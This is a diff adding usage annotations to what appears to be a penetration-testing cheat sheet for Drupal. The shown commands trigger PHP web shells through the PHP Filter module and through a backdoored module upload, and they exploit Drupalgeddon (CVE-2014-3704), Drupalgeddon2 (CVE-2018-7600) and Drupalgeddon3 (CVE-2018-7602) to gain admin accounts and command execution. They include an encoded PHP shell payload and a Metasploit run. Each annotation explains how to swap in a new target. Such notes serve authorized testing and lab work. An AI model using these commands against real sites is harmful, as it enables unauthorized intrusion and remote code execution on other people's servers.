@@ -33,6 +33,7 @@ Unlike WordPress/Joomla, there's no "edit theme file" shortcut — must go throu
    curl -s -b session_cookie \
      "http://target/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"
    ```
+> Triggers the PHP Filter shell node with the admin session cookie; swap `target`, the node ID, param name, and command.
 
 ### Access control gotcha
 The node may show "Access denied" to unauthenticated users. Pass the admin session cookie with `-b` flag if needed.
@@ -71,12 +72,14 @@ tar cvf captcha.tar.gz captcha/
 # Install via admin: Manage → Extend → Install new module
 # Upload captcha.tar.gz → Install
 ```
+> Downloads a real module, plants a PHP shell + .htaccess, and repacks it for upload; swap the module URL and shell param.
 
 ```bash
 # Trigger shell
 curl -s "http://target/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
+> Executes commands through the shell inside the uploaded module; swap `target`, the module path, param, and command.
 
 **Note:** Installing a module modifies the client's site — confirm scope before doing this.
 
@@ -101,6 +104,7 @@ python2.7 drupalgeddon.py -t http://target -u hacker -p pwnd
 
 # Then log in and use PHP Filter for RCE
 ```
+> Exploits Drupalgeddon (CVE-2014-3704) SQLi to create an admin account; swap `target` and the new `-u`/`-p` creds.
 
 Metasploit: `exploit/multi/http/drupal_drupageddon`
 
@@ -121,6 +125,7 @@ echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz
 
 curl "http://target/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
 ```
+> Runs Drupalgeddon2 (CVE-2018-7600) to drop a PHP shell, then executes commands through it; swap `target` and the shell param.
 
 ### CVE-2018-7602 — "Drupalgeddon3" (Drupal 7.x, 8.x)
 
@@ -137,6 +142,7 @@ set DRUPAL_NODE 1
 set LHOST tun0
 exploit
 ```
+> Runs Drupalgeddon3 (CVE-2018-7602) via Metasploit using a valid session; swap rhosts, VHOST, the session cookie, node ID, and LHOST.
 
 ---
 
@@ -174,6 +180,7 @@ curl -s -b SESSION_COOKIE \
 
 # 5. Cleanup: DELETE /node/3/delete
 ```
+> Full PHP Filter lab chain: hit the shell node with the admin cookie to list `/var/www/` and read the flag; swap the host and flag path.
 
 Node access is denied to anonymous — must pass `-b` session cookie to trigger PHP execution.
 
